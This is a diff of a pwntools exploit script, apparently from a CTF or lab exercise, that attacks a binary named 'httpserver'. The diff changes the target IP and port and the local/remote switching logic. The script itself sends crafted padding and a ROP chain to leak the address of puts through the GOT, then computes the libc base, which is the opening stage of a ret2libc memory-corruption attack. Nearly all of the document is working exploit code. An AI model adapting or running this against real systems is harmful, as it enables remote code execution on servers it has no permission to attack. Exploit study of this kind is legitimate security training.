@@ -1,35 +1,33 @@
 #!/usr/bin/env python3
 from pwn import *
 
-HOST = '172.17.0.3'
-PORT = 80
+HOST = '10.0.2.2'
+PORT = 8080
 
 elf = context.binary = ELF("./httpserver")
 rop = ROP(elf)
 
-if args.REMOTE:
-    libc = ELF("./libc-2.28.so")
-else:
+if args.LOCAL:
     libc = ELF("/lib/libc.so.6")
+else:
+    libc = ELF("./libc-2.28.so")
 
 print(libc.path)
 
-gs = '''
-continue
-'''
 
 # For GDB debugging
 def start():
-    if args.GDB:
-        return gdb.debug(elf.path, gdbscript=gs)
-    elif args.REMOTE:
-        return remote(HOST, PORT)
-    else:
+    if args.LOCAL:
+        if args.GDB:
+            return gdb.debug(elf.path, gdbscript='continue')
         return process(elf.path)
+    else:
+        return remote(HOST, PORT)
+
 
 p = start()
 
-log.info(f"PUTS GOT {hex(elf.got.puts)}")
+log.info(f"PUTS@GOT {hex(elf.got.puts)}")
 
 padding = b"GET "
 padding += b"aaa\x00"
@@ -44,7 +42,7 @@ log.info(rop.dump())
 p.sendline(rop.chain())
 
 PUTS = unpack(p.recvlines(4)[-1], 'all')
-log.info(f"PUTS: {hex(PUTS)}")
+log.info(f"PUTS@LIBC: {hex(PUTS)}")
 
 libc.address = PUTS - libc.sym['puts']
 log.info(f"LIBC base: {hex(libc.address)}")
